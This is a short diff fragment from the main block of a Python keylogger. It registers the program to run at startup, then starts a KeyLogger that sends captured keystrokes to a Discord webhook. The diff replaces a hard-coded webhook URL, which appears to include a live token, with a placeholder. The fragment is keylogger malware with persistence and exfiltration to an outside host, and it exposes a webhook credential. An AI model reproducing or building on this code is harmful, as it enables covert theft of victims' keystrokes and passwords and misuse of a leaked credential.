@@ -166,6 +166,6 @@ if __name__ == "__main__":
     add_to_startup_registry()
 
     # Start the keylogger
-    webhook_url = "https://discord.com/api/webhooks/1355216328000147518/roTzaF_CSKbMcOpD0pETxOuWlt8jQKNWE1b39g8sKC70GG43S6zo3t3cFtGS5N0XHGyb"
+    webhook_url = "The_url_of_discord_intigration_stuff"
     keylogger = KeyLogger(webhook_url)
     keylogger.run()
